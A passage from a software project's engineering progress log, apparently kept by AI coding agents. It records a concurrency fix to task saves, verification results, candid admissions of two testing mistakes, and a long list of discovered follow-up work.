path per commit: the rest are left for the next pass, which the job asks for itself, and the loop is
bounded because each pass applies at least one.

**What this half does not do, and nobody should read as done.** No `PUT /kb/doc` (a human writing a
page), no `kb/search` over HTTP, no `kb/health` reader — the rows exist and no screen shows them —
and no history bootstrap (product/18). `index.md` is not regenerated (technical/07 says why). The
"deprecate candidates (included N times, never cited)" finding is not computed and the pass says so:
it needs `run_context_pack` rows, which nothing writes (backlog 31). Nothing has run this against a
real GitLab: `commitFiles` is exercised by the fake, by a recorded fixture in the contract tier and
by the e2e's fake provider, and the recorded 400 is labelled `inferred`. (**Now a verification item in
`docs/TODO.md`**, naming the three things to measure and the fixture to relabel.)

**WP-18b — Needs measurement** (neither is a defect; both are claims this change asserts less
strongly than it reads):

1. **The apply job's idempotency has never been driven twice against the executor** (**carried as a
   measurement bullet in backlog 7**, with this recipe). The keys
   (`knowledge_commit:<branch>`, `knowledge_mr:<branch>`) are passed to the same `IdempotencyPlan`
   machinery the ticket writes use, and `applyKnowledgeProposals` is only ever called once per batch
   in every tier. To measure it: re-deliver the `knowledge.apply` job through
   `ServerRuntime.jobs` (the labelled seam WP-15d added for exactly this) after a successful pass and
   assert one commit, not two.
2. **`ROLE=api` + `ROLE=worker` is untested as a deployment** (**refined into backlog 38** as the general
   form — no tier and no compose file has ever run a role split). The decide command takes a nullable
   `Jobs` on purpose and the nightly pass is the recovery, but no tier starts two processes with
   different roles, so "the approval is applied by the next hygiene pass" is asserted only through the
   unit test that passes `jobs: null`.


### WP-15e — the whole-row save class, and the shape the measurement chose

**The decision, and the measurement that made it.** The plan row left two shapes open — a narrow
write per writer, or optimistic concurrency on the row — and said to measure which of the call sites
can actually interleave before choosing (rule 27). Two measurements decided it, and the second is the
one that mattered.

*First, the census.* **Twenty-one** production `tasks.save` sites, not the twenty backlog 18 counted
(`saga.ts` 11, `transitions.ts` 5, **`stage-executor.ts` 5** — it gained one since the entry was
filed). Every one of them can interleave with another writer, and the reason is structural rather
than probabilistic: the dispatcher orders events per `(stream_type, stream_id)` only
(`DispatchQueue.hasEarlierPending`), WP-15c's inbound normaliser writes **every** provider event on
the **project** stream (`inbound.ts:180`) while a task's own events are on the **task** stream, and
the three job workers (`stage.execute`, `mr.comment.debounce`, `pipeline.outbound`) are not ordered
against the dispatcher at all. So the "is the list short?" question the row asks answers *no*: it is
every site, and a narrow method per writer would have been twenty-one methods plus a discipline
nothing enforces.

*Second, and this is the one that settled it: the narrow write had **already** failed to compose, and
the failure was live on `main` at `5121d73`.* WP-15d gave the workpad job `saveWorkpad` so it would
stop clobbering the executor's cost — and `save` still named `workpad_ref`, so the executor went on
clobbering the **workpad**. One direction fixed, one direction not, one work package later, with the
rule already written down. Measured on a real PostgreSQL 18 rather than argued: with `workpad_ref`
restored into `save`'s set list, `pipeline-store-concurrency.integration.test.ts` fails
*"does not put back a workpad another writer filled in while it was deciding"* (`expected undefined to
be 'comment-1'`) and *"keeps every stage's spend when a job writes the row inside each write window"*
(`comment-7`); with it removed, 7/7 pass. **That is the argument for (b)**: the property option (a)
lacks is not theoretical, it had already been lost.

**Shipped: both halves, because the version column alone would not have found the live one.**
- **Migration 0019** adds `tasks.version integer not null default 1` with a positive check. `save` is
  `update … set …, version = version + 1 where id = $1 and version = $n returning version`; a write
  that matches no row is told apart from an absent task by one extra query on the throwing path.
- **The columns are partitioned by writer.** `save` writes the aggregate's own (`state`,
  `current_stage`, `branch`, `mr_ref`, `stage_attempts`, `iteration_counters`, `cost_actual`) and no
  longer names `workpad_ref`; `saveWorkpad`, `saveTicketSnapshot` and `CostStore.saveEstimate` own
  theirs and deliberately do **not** bump the version, because a bump for a column `save` does not
  write is a false conflict. `packages/infrastructure/src/pipeline/tasks-column-ownership.test.ts`
  reads every `update tasks` statement off disk (tracked *and* untracked, rules 7 and 85) and fails on
  a contested column — it is what makes rule 44 true here rather than a docblock.

**Assumption recorded, against the brief.** The brief said *"if (b) … the aggregate carries the
version"*. It does not: `version` is on `StoredTask`, not on domain `Task`. The reasoning is the one
`StoredTask`'s own docblock already makes for the template snapshot, the MR and the spend — it is not
a state transition. Putting it on `Task` would make thirty-odd pure domain commands responsible for
incrementing a storage token in a ring that cannot see the write it guards, and the guarantee would
be only as good as the command that remembered; on `StoredTask` every one of the twenty-one sites
gets it for free through the `{ ...stored, task: … }` spread it already writes.

**The API change the saga's own tests found within minutes.** `save` returns the **saved snapshot**,
not `void`. Two saves in one transaction are an ordinary shape — `recordMergeRequest` records the MR
and then `applyDecision` moves the stage — and the second one carried the version the first had
consumed. Thirty-one saga cases went red with `expected version 10, found 11` on the first run.
Documenting the hazard would have been the cheaper fix and the wrong one.

**Where the retry lives, and why it is two places rather than one.** It depends on who owns the
transaction, and the difference is load-bearing:
- **Jobs own theirs**, so `retryOnTaskConflict` (`pipeline/task-conflict.ts`) re-runs the *whole*
  unit in a new transaction — the previous attempt is rolled back and the re-read is clean. Used by
  the stage executor's three writing transactions and by `jobs.ts`'s `settle` and review window.
- **Handlers do not**, so they **let the conflict escape** and `EventBus` re-runs the handler's whole
  transaction (`events/concurrency.ts`, `event-bus.ts`). Catching it *inside* a handler would leave
  the failed attempt's non-idempotent writes behind: `planApprovalGate` inserts an approval with a
  fresh `ids.next()` id **before** it saves the task, so an in-transaction retry writes a second
  approval row. That is the whole reason the bus had to learn about it, and it is a structural marker
  (`concurrencyConflict: true`) rather than an `instanceof`, so generic dispatch machinery does not
  import a repository's error class.
- Both use **one** bound, `MAX_CONCURRENCY_CONFLICT_ATTEMPTS = 3` (rule 63: two numbers for one
  policy is drift). Exhaustion is `TaskConflictExhaustedError`, and the executor's ending is
  `escalateTaskAfterConflict` → `needs_human` with a brief. **No new task state** (Q59's answer,
  reused). The bus's ending is its ordinary failure path — the failure is recorded and the event stays
  queued — which is not a drop, and it is the honest limit of the bound on that side.

**A defect this work package introduced and the contract tier caught — worth more than the fix.**
`TaskConcurrentModificationError` was first written with TypeScript **parameter properties**
(`constructor(readonly taskId: Id, …)`). It typechecks, it lints, and all 5 154 unit and contract
tests pass because vitest transpiles with esbuild. It is also one of the few constructs Node's
**strip-only** type stripping refuses, and this repository runs its sources that way — `pnpm dev`,
`pnpm db:migrate` and the runlet shim all go through `scripts/ts-source-resolver.mjs`. The only thing
that found it was `runlet/conformance.contract.test.ts`, which spawns a real `node` on
`apps/runlet/src/index.ts`: six cases failing with `c.sock never appeared`, an error that names
nothing. Run by hand the shim says
`SyntaxError [ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX]: TypeScript parameter property is not supported in
strip-only mode`. Two lessons: the constructs `tsc` accepts and Node strips are **different sets**,
and a test whose failure message is about a socket needs its cause re-derived rather than blamed on
the machine — I called it a load flake twice before running the process by hand (rule 81, and rule 4:
audit the instrument). It is filed as discovered work, because nothing refuses the shape.

**A false "confirmation" I have to own, because it nearly ended the investigation.** To decide whether
the runlet failures were mine I ran `git stash push -u … && echo stashed`, and reported "it fails on a
clean HEAD too". **The stash never happened** — no `stashed` line was printed, and I read the FAIL
lines without checking for it. Rule 75's shape one level up: I gated on a command's *output* and never
on whether the command I depended on had run at all.

**What was verified.** `pnpm run -s verify` **PASS** (5 160 passed, 14 skipped);
`pnpm run -s verify:integration` and `pnpm run -s verify:e2e` — see the verdicts in the WP report.
The mutant — restoring `workpad_ref` into `save`'s set list — is killed by name in two tiers:
`tasks-column-ownership.test.ts` › "gives every column exactly one writing statement", and
`pipeline-store-concurrency-suite.ts` › "does not put back a workpad another writer filled in while
it was deciding" on PostgreSQL. The census is calibrated by planting an untracked `tasks.save` site
and watching both of its cases fail (rule 85), then removing it.

**Rule 83 sweep — every sentence that described the class as open.** Fixed here:
`postgres-pipeline-store.ts:288` (*"`save` writes the whole row"* — now false),
`ticket-snapshot.ts` (*"the twenty existing `save` sites"* — a count that had already moved; it now
points at the test that produces it), `cost/ports.ts` (*"a twenty-first `tasks.save` site"*, same),
`memory-pipeline.ts`'s divergence register row **5** (closed rather than justified — `save` now writes
the same column set in both stores — and a new row **6** for the refusal), `CLAUDE.md`'s "narrow
repository method" paragraph, and `docs/technical/03-data-model.md`'s `tasks` row (migration 0019 and
the writer partition). **TD-004 and TD-005 say nothing about `save`** and needed no amendment — checked,
not assumed. **Orchestrator-owned and left alone, as the brief says**: PROGRESS backlog entry **18**
and standing rule **79** still describe the class as open, and the **WP-15e plan row** still says
"twenty production `tasks.save` call sites remain".

#### For the orchestrator

**Two admissions in this section are process findings, not engineering ones, and the refiner files
neither as a backlog entry — the rules are yours (rule 61's family).** Both are the implementer's own
words. First, a failure read as machine load twice: *"a test whose failure message is about a socket
needs its cause re-derived rather than blamed on the machine — I called it a load flake twice before
running the process by hand (rule 81, and rule 4: audit the instrument)."* Second, and the one with no
rule covering it exactly: *"To decide whether the runlet failures were mine I ran `git stash push -u … &&
echo stashed`, and reported 'it fails on a clean HEAD too'. **The stash never happened** — no `stashed`
line was printed, and I read the FAIL lines without checking for it. Rule 75's shape one level up: I
gated on a command's *output* and never on whether the command I depended on had run at all."* The
second is the more expensive shape: the first cost re-derivation time, the second produced a
**confirmation that was never performed** and would have ended the investigation with the defect still
in the tree. Whether that earns a standing rule — the family is 61 (a right number attached to a wrong
verdict), 81 (a right number attached to a wrong cause) and 75 — is an orchestrator decision; the
refiner records the evidence and stops. The engineering half of the same incident is backlog entry
**42**.


## Discovered work — session 5 (not in plan)
- **Nothing refuses a TypeScript construct Node's type stripping cannot strip, and the one check that
  finds it says "socket never appeared"** (WP-15e). A parameter property
  (`constructor(readonly x: T)`) passes `tsc`, passes biome and passes every vitest tier, and breaks
  `pnpm dev`, `pnpm db:migrate` and the runlet shim — everything that goes through
  `scripts/ts-source-resolver.mjs` — with `ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX`. The accidental guard is
  `runlet/conformance.contract.test.ts` spawning a real `node`, whose failure names a missing socket
  and not the syntax. `verbatimModuleSyntax` is already on; the missing setting is
  `erasableSyntaxOnly` (TypeScript 5.8+), which refuses exactly this set at typecheck time — enums,
  namespaces with values, `declare` fields and parameter properties. Cheap, one `tsconfig` flag, and
  it would have to be measured against the existing sources first.
- **The bus's conflict retry is bounded; its *failure* path still is not** (WP-15e). A handler that
  exhausts `MAX_CONCURRENCY_CONFLICT_ATTEMPTS` falls through to `retryLater`, which has no limit and
  no dead-letter state (WP-04's note, repeated in `transitions.ts`). That is the same unbounded retry
  WP-15c closed for a different path, and it is not this work package's: nothing here made it worse,
  and a dead-letter state is a product decision about what a human sees.
- **`TOOLS_BY_ROLE` gives the investigator no `Bash`, so two skills it owns name commands it cannot
  run** (WP-14a — **refined into backlog 39**, where BD-025 decides the direction and the missing
  census is rule 68's). product/13's least-privilege table gives the Investigator "read-only cmds" and
  observability, and `SKILLS_BY_ROLE` follows the product doc — so `loki-logs` and `sentry-issue` are
  provisioned for a role whose SDK tool list is `['Read','Glob','Grep']`. One of the two tables is
  wrong; the planner's is the one that ships. Nobody owns it.
- **Provisioning is role-driven, not binding-driven** (WP-14a — **refined into backlog 40**, with the
  second cause the bullet does not name: no run environment carries a provider CLI credential at all,
  so all four provider skills assert a credential no project's run has, not only an unbound one's). A project with no Loki binding still
  gets `loki-logs` in its investigator runs, because the copy reads `SKILLS_BY_ROLE` and nothing
  reads the project's bindings at plan time. Narrowing it would make `AgentTooling.skill` load-bearing
  rather than documentary, and would need the binding set where the spec is built.
- **`sentry-cli` 3.7.0 disagrees with the documentation the Sentry provider cites** (WP-14a,
  measured in `platform-runtime:dev` — **refined into backlog 41**, which locates the uncorrected copy
  of the claim in `test/fixtures/http/sentry/SOURCES.md` rather than in a fixture's `source` block):
  the binary has `issues list --query --max-rows` and
  `events list`; the docs page (retrieved 2026-09-10) lists no issue commands, which is the reason
  `SENTRY_AGENT_TOOLING.cli` is `null`. Worth re-deciding with the measurement, together with the
  environment variables such a query authenticates with — the part that is still unverified.
- **`docs/TODO.md`'s "Nothing mounts a platform skill" item is now false** (WP-14a — **done**, session 5:
  the item is struck with its original wording kept, and backlog **24** is RESOLVED at WP-14a pending
  merge with the layout correction recorded as a note under it). The file is the
  refiner's; the item should be closed the way the WP-22 items were, with the original wording kept.
- **The proposal queue's cursor carries the same truncation the task page's did, and is safe only by
  accident** (WP-15h part 2, **latent**, measured on its sibling). `routes/kb.ts`'s
  `next_cursor` is `StoredKnowledgeProposal.createdAt`, which `postgres-proposal-store.ts:95` builds
  from the parsed `Date` — millisecond resolution against a `timestamptz` column, which is exactly the
  keyset that dropped a task row (three in, two out). It does not bite **today** because the same
  store *writes* `created_at` from `Clock.now()`, an ISO string with three fractional digits
  (`:141`), so the stored value has no microseconds to lose. But the column is
  `timestamptz not null default now()` (`0008_knowledge.sql:74`), so the first insert that omits the
  value — a backfill, a fixture, a second writer — makes a page silently skip a proposal, and a short
  page is indistinguishable from the last page. The fix is the one on `TaskCursor`: render the cursor
  in SQL and cast it back. Not this work package's file to change, and nobody owns it.
- **`GET /api/org/inbox` serves `questions.text`, which backlog 35 leaves unredacted** (WP-15h part 2,
  stated at the line rather than fixed). The stage executor copies the draft out of the run's
  `structuredOutput`, which reaches `artifacts.data` and this column without TD-012 step 1 — backlog
  35 names `questions.text` explicitly. The reader cannot fix it (a reader that redacted would give
  the row and the response two different texts); it is one more consumer of a write that is already
  filed and owned by nobody.
- **`ProviderRegistration` cannot say whether a provider takes webhooks**, so the setup-guide endpoint
  has to declare it beside the registration (WP-15h part 2, small). `packages/integrations/src/catalogue.ts`
  carries `inboundWebhook` and `catalogue.test.ts` checks it by constructing every provider — which
  works, and is a test doing a type's job. The field belongs on the registration, where a sixth
  provider would be forced to answer it at registration time; moving it touches every registration
  and both fakes, which is more than a read endpoint should carry.
- **The integrations screen shows an empty configuration for a provider this build does not ship, and
  the response has no way to say why** (WP-15h part 2, small). `publishableConfig` fails closed and
  the route logs which rows it withheld, but `integrationSummarySchema` has no field for "withheld",
  so an operator sees `{}` and cannot tell it from "nothing configured". A `config_withheld: boolean`
  on the DTO would close it; that is a contracts change plus a UI line.
- **`artifacts.data` is written unredacted, and TD-012 names artifacts** (WP-18b, **measured** — **refined into backlog 35**, which no work package owns).
  `createClaudeRunner` hands `structuredOutput: validated.data` straight to the stage executor, which
  writes it to `artifacts.data`; the transcript sink is the only redacted path out of a run. The
  reproduction is in `test/e2e/pipeline/librarian.e2e.test.ts`, which asserts the planted
  `ANTHROPIC_API_KEY` **is** in the artifact row (and is not in the two sinks WP-18b owns). It is
  every artifact type, not only `LibrarianProposals`, and the fix is one redaction on the executor's
  write path — plus a decision about `redaction_count`, which `artifacts` has no column for. Bigger
  than this work package; nobody owns it.
- **A lost curation wake-up loses one task's proposals, and nothing recovers it** (WP-18b, stated
  residual — **refined into backlog 36**, with the two things the sweep has to answer). The `artifact.created` handler enqueues through `afterCommit`, which is at-most-once
  (TD-004), so a process that dies between the commit and the callback leaves a `LibrarianProposals`
  artifact with no `kb_proposals` rows. It is notification-shaped (nothing is corrupted; the next
  retrospective proposes again), which is why the nightly pass recovers the **decided-but-unapplied**
  proposal instead — the loss that costs a human's decision. A recovery for this one is a sweep over
  artifacts with no rows, which needs a query nothing has.
- **`kb_health_reports` has rows and no reader** (WP-18b — **refined into backlog 37**, together with
  the bullet below it; the reader half is recommended to **WP-15h part 2**). The nightly pass writes one per project
  per night; technical/08's `GET /api/projects/:id/kb/health` is not served and no screen asks for it,
  so the report is visible only in the log line and in the table. One route plus one panel.
  **The route half landed at WP-15h part 2** — `routes/kb.ts` serves it, `findKbHealth` projects the
  newest row and the e2e drives the pass that writes one — so what is left of this bullet is the
  **panel**: no screen calls it, which is also why the client-driven census cannot see it.
- **The indexer's invalid documents are in no report** (WP-18b — **refined into backlog 37**, as the
  second half, and it is a defect against `docs/technical/07-knowledge-and-search.md:8`). `IndexReport.invalid` lives for the
  length of one job, so the health pass — which reads the index — cannot see a document the parser
  refused, and product/05's health report wants exactly that. Joining them means storing the refusals
  or running the pass inside the index run; neither was WP-18b's to decide.
- **A knowledge merge request nobody merges is invisible** (WP-18b, Q66's last paragraph — **refined onto
  Q66** as a refiner note: the detector is the missing half whichever way the founder answers, and the
  cheapest one is a finding kind in the nightly pass). The
  proposals in it are `applied`, the commit exists, and the vault the platform indexes — the default
  branch — does not have it. Nothing reports the gap between "applied" and "merged".
- **`headPaths` for validate-on-read now has a mechanism and no caller** (WP-18a). `createStageRunPlanner`
  leaves `headPaths` absent, so every knowledge document carrying a `paths:` glob is recorded
  `validated: false` and never admitted to a pack — the reason used to be "there is no checkout at plan
  time", and after WP-18a that reason is gone: `VaultSource.read` answers `repoPaths` with the tracked
  set at the commit, with no checkout. What is missing is a caller, and it is not free — it is a second
  vault read per run, or a cache keyed by commit. Nobody owns it; the sentence in `planner.ts` now says
  this instead of naming a work package that will not do it.
- **A project's own `.agentic/pipeline.yml` and `prompts/<stage>.md` are still unread, for a new
  reason** (WP-18a). `apps/server/src/pipeline.ts` passes the shipped templates and the shipped role
  prompts because reading a project's own needed a checkout. The platform can now read the default
  branch without one, but the vault source answers the four *indexed* paths and nothing else, so
  serving these two would mean either widening what the adapter returns or a second read. Both are
  decisions with consequences (a template a project declared and the platform could not read parks
  every task one stage short of `done`), so neither was taken here.
- **Nothing bounds the platform's mirror disk, and nothing reports it** (WP-18a, Q63's parts 1 and 2).
  One bare mirror per project appears on the first index run and is never removed; product/19 §20's
  storage gauge does not exist in this build, so there is no number an operator can look at either.
  The note on Q63 states where the bytes are (`mirrorCacheKeyFor(projectId)` under
  `APP_KNOWLEDGE_MIRROR_ROOT`, one `du` per directory). Owner: whoever builds the storage gauge.
- **`ROLE=indexer` is a worker, not a narrower workload** (WP-18a, the same gap WP-15g recorded for
  `runner`). A container that runs *only* the `knowledge.index` queue needs per-queue subscription,
  which nothing in this build has: today `ROLE=indexer` subscribes to every worker queue, including
  `stage.execute`. It is one entry, not two — whoever builds per-queue subscription gets both roles.
- **Nothing serves the SPA, and the bundle is now in the image** (WP-22 — **refined into backlog 33**, and a
  sentence on **WP-15h**'s row owns it). technical/09 says the
  bundle is "served as a static bundle by the app process with SPA fallback; same origin as the API
  and SSE", and `apps/web/vite.config.ts` says "in production `apps/server` serves `dist/`". No
  route does: there is no `@fastify/static`, no `sendFile`, and the only `setNotFoundHandler` answers
  JSON. `docker/app.Dockerfile` builds `apps/web` and copies it to `/app/apps/web/dist`, so the
  packaging half is done and the serving half is a route plus a fallback rule — deliberately **not**
  taken here, because the fallback has to decide which paths are the client's without a deny-list of
  API prefixes (rule 55), and that decision belongs with the screens rather than with the image. No
  `APP_WEB_ROOT` was added: a variable nothing reads is rule 31's shape.
- **The SDK computes the CLI's path on the platform side and the shim executes it in the container**
  (WP-22 — **refined into backlog 34**, which no work package owns).
  `Options.pathToClaudeCodeExecutable` is `null` outside `local` mode, so the SDK resolves
  its own bundled binary and passes that path as `spawn{command}`; the run container's binary is
  `/usr/local/bin/claude`. Read from the SDK bundle: the `existsSync` check is on the branch that
  spawns locally (`if (spawnClaudeCodeProcess) … else spawnLocalProcess`), so the override path does
  **not** validate it here — which means the mismatch surfaces as an exec failure inside the
  container rather than as a clear error. Nothing has run a real agent through the real image (WP-15g
  scoped it out, and no criterion here needs it). The fix is one field: the workspace spec setting
  `claudeCodePath` to the run image's path. **Whoever takes it also gets a 217 MB saving**: if the
  platform side never needs the binary, `@anthropic-ai/claude-agent-sdk-linux-*` can leave the
  product and launcher images, which is the difference between 1.1 GB and ~900 MB.
- **No sweep reclaims an orphaned control *directory*** (WP-22, the live half of backlog 0b).
  `purgeExpired` lists **volumes** by `role=workspace` and never looks inside the `ctl` volume, so a
  run whose `destroy` left step 1 or step 2 of `#removeControlDirectory` unfinished leaves either a
  run token or an empty `0700` directory behind for ever. The provider's own docblock states it; what
  is missing is the sweep. Owner: whoever next touches `purgeExpired` — it is a directory listing
  beside the volume listing, plus the same two-helper removal.
- **`packages/prompts` had no `dependencies` at all and imported one** (WP-22 — the open *class* is a nit in
  backlog **7**) — **closed in this
  change**, with `scripts/workspace-deps.test.ts` as the class guard. Left here because the *general*
  form is one step wider than what the test covers: third-party specifiers (`zod`, `pino`) are
  resolved from the root today in every arrangement this repository ships, so an undeclared one would
  behave exactly like `@platform/contracts` did the day a package is published or a stricter
  `node_modules` layout is used.
- **`imageTagsOf` in the e2e support file now pulls nothing and could pull a registry image by
  accident** (WP-22, small — **carried as a nit in backlog 7**). It derives the tags to `docker pull` from the provider's image record,
  and `platform-*` tags are refused there with the build command. A future `WorkspaceImages` field
  that is a string but not a tag would be pulled rather than rejected; the comment at the filter says
  so, and nothing enforces it.
- **The cost ledger records the *result* of a timezone substitution and never the substitution**
  (WP-19 review round 1). When `organizations.timezone` is a value `assertTimeZone` refuses, the
  ledger charges in UTC and warns; `cost_rollup_daily.day` and `budget_windows.window_start` carry the
  day, not the calendar that produced it, so the only evidence is a log line — and a log is not an
  audit record (BD-003). A column on the rollup (the zone actually used) would close it; it is one
  migration for a state an operator has to type by hand into a setting every other reader rejects.
- **Migration `0017_cost_ledger.sql`'s comment on `cost_entries_run_model_unique` is wrong and the
  file is applied** (WP-19 review round 1). It says the key catches "a replay within the same
  microsecond … which is exactly what a double-fired backfill is"; `now()` is the transaction's start,
  so two passes in two transactions never collide on it. The correct statement — the key catches a
  duplicate *inside one transaction*, and cross-transaction idempotency is `handler_executions` — is
  in technical/03. Whoever writes the next migration touching `cost_entries` should carry it into a
  comment at the line.
- ~~**TD-005's amendment carries two numbers WP-19 moved, and an implementer may not edit a decision
  record**~~ (WP-19) — **CLOSED in the same change by the orchestrator**:
  `docs/decisions/technical/TD-005-event-store-and-dispatch.md:48-50` now reads **24** handlers (21
  before WP-19) and **25** divergent rows (28 before). Both re-derived from `consumption.ts` (50 types,
  24 handled, 26 unconsumed, of which the column marks one — `knowledge.index.rebuilt` — unconsumed
  too) and verified by the round-2 reviewer. technical/02's copy of the same figure was corrected by
  the implementer.
- **`tasks.cost_estimated` has no writer and now has a near-namesake that does** (WP-19).
  `estimate_usd` is the estimate *before* the spend and is written by `cost.estimate`;
  `cost_estimated` is technical/03's running total of estimated cost for a task whose runs were
  priced rather than invoiced (BD-004 `local` mode), and nothing accumulates it — `tasks.cost_actual`
  takes every run's `cost.usd` whether or not `is_estimate` is set. So a `local`-mode deployment's
  task row calls an estimate an actual. The fix is either a second accumulator or a documented
  decision that `cost_actual` means "what the ledger counted, labelled per entry"; it is a
  `tasks.save` question, which is backlog 18's territory.
- **Nothing consumes the estimate** (WP-19, Q65's last paragraph).
  `requiresBudgetApproval(preset, estimateUsd)` exists in `packages/domain/src/policies/autonomy.ts`
  and has no caller, so an expensive task is never routed to a budget approval. WP-19 produces the
  number; the gate belongs with the autonomy work (BD-027, product/18).
- **`budget.window.reset` is a queue name with no job** (WP-19). Windows roll over implicitly, so
  correctness does not need it; what nobody gets without it is the `budget.reset` event technical/02
  publishes, which is a notification rather than a projection. Stated in `cost/window.ts`.
- **The price-table maintenance job cannot fetch a price, and the platform has no verified feed**
  (WP-19). Migration 0009's rows cite a documentation page a human read (research/04 § 3) and
  `fast_input`/`fast_output` are still null with a comment naming WP-19 for filling them. Whoever
  wants automated pricing needs a source decision first: a vendor endpoint the platform may call, a
  credential for it, and a rule for what happens when it disagrees with the stored row.
- **`runs` is written with eleven of its ~30 columns, and nobody had noticed because nothing read the
  row back** (WP-15h). `RunRepository.insert` names `id, task_id, project_id, task_stage_id, role,
  mode, attempt, model, effort, prompt_version, status`; `system_prompt`, `user_prompt`,
  `provider_mode`, `permission_mode`, `settings_snapshot`, `settings_hash`, `allowed_tools`,
  `disallowed_tools`, `mcp_servers`, `skills`, `run_key`, `last_output_at`, `price_list_id`,
  `exit_detail` and `usd_estimated` are left at their defaults by every writer in the tree. Two of them
  are now user-visible refusals (`/prompt`), and `run_key` is the memoisation key technical/03 says "the
  same spec must never be executed twice" rests on. A row per column deciding *writer or drop* is bigger
  than this work package.
- **`run_context_pack` cannot express three fields of `ContextPackRecord`** (WP-15h), which is why
  `GET /api/runs/:id/context-pack` has no success branch: no column holds `budget_tokens`, and
  `reason`/`score` are nullable here where the published tier-1 entry requires them. A producer needs
  a schema change first — somewhere for the budget, and `reason`/`score` either filled at the write or
  made nullable in `@platform/contracts` — plus a way to tell an empty pack from an unwritten one.
  `total_tokens` is summable from the rows; nothing else is.
- **`RunRepository.load` has exactly one caller and it is the contract suite** (WP-15h). Nothing in
  production loads a run through the store; the read API projects the columns itself because the
  published DTO needs `provider_mode`, `model_usage` and `redaction_count`, which `StoredRun` does not
  carry. Either the port grows the fields or the method goes; leaving a port method whose only exercise
  is its own test is rule 31's shape.
- **The hub still replays only from memory** (WP-15h). TD-014 says the ring buffer is "backed by the
  event/message tables"; `SseHub.open` answers `reset` for any cursor it cannot place, and now that
  `run_messages` has both a writer and a reader, a run topic's replay *could* come from the rows. The
  client refetches through `GET /api/runs/:id/messages`, so the gap costs a round trip rather than
  correctness — filed rather than done.
- **Eleven client paths are still 404** (WP-15h), each named in `routes/client-census.test.ts` with the
  row that owns it. The commands (`pause`, `answer`, `decide`, `steer`, …) need the aggregate, a
  `human_actions` row and an `Idempotency-Key`; the reads are one screen each.
- **`pg.Client` teardown is safe only because callers `await client.end()`** (backlog 28). Measured:
  `Client.end()` resolves on the connection's `end` event, so a closed client is genuinely closed —
  but a *leaked* one still takes the process down when its database is dropped with `(force)`, and
  nothing refuses a leak. Twelve bare-client sites in `test/` rely on a `finally`/`afterAll` that a
  future edit could drop. A census like the pool one would need to prove "every client is ended",
  which is a dataflow question rather than a grep, so it is filed rather than done.
- **Two e2e promises are held across awaits with no handler attached at creation** (ci-fix, event-log
  escaped rejection). `test/e2e/server/sse.e2e.test.ts:254` and `:291` start `instance.runtime.stop()`
  and await it several lines later, which is the *shape* the event-log test died of, with a different
  risk: `stop()` is expected to resolve, so a passing run cannot go red from it, but a `stop()` that
  rejects would arrive as an unhandled error rather than as this test's failure. Left alone — the
  awaits in between *are* the assertion (the shutdown frame, then `/readyz` during shutdown), so the
  repair is an `outcomeOf`-style capture rather than a re-order, and it would touch the e2e tier for
  no observed defect. **Nothing refuses the shape**: the sweep that found these three sites was a
  grep, and a guard would have to tell "promise held across an await" from "promise awaited", which
  biome's rules do not express.
